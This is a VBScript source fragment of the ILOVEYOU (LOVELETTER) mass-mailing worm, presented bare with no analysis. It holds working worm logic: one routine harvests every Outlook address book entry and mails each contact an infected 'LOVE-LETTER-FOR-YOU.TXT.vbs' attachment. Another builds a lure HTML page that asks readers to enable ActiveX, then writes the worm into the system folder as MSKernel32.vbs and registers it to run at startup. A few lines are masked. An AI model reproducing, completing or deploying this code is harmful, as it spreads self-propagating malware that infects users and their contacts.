function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget = regedit.RegRead(value)
end function

function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function

function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function

sub spreadtoemail()
On Error Resume Next
dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
set regedit = CreateObject("WScript.Shell")
set out = WScript.CreateObject("Outlook.Application")
set mapi = out.GetNameSpace("MAPI")
for ctrlists = 1 to mapi.AddressLists.Count
set a = mapi.AddressLists(ctrlists)
x = 1
regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
if (regv = "") then
regv = 1
end if
if (int(a.AddressEntries.Count) > int(regv)) then
for ctrentries = 1 to a.AddressEntries.Count
malead = a.AddressEntries(x)
regad = ""
regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead)
if (regad = "") then
set male = out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
end if
x = x + 1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out = Nothing
Set mapi = Nothing
end sub

sub html
On Error Resume Next
dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6
dta1= "<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ 
CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file
<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z-------------------
-z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2= "set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1 = replace(dta1, chr(35) & chr(45) & chr(35), "'")
dt1 = replace(dt1, chr(64) & chr(45) & chr(64), """")
dt4 = replace(dt1, chr(63) & chr(45) & chr(63), "/")
dt5 = replace(dt4, chr(94) & chr(45) & chr(94), "\")
dt2 = replace(dta2, chr(35) & chr(45) & chr(35), "'")
dt2 = replace(dt2, chr(64) & chr(45) & chr(64), """")
dt3 = replace(dt2, chr(63) & chr(45) & chr(63), "/")
dt6 = replace(dt3, chr(94) & chr(45) & chr(94), "\")
set fso = CreateObject("Scripting.FileSystemObject")
set c = fso.OpenTextFile(WScript.ScriptFullName, 1)
lines = Split(c.ReadAll, vbcrlf)
l1 = ubound(lines)
for n = 0 to ubound(lines)
lines(n)=replace(lines(n), "'", chr(91) + chr(45) + chr(91))
lines(n)=replace(lines(n), """", chr(93) + chr(45) + chr(93))
lines(n)=replace(lines(n), "\", chr(37) + chr(45) + chr(37))
if (l1 = n) then
*************
else
************
end if
next
set b=fso.CreateTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines, vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub

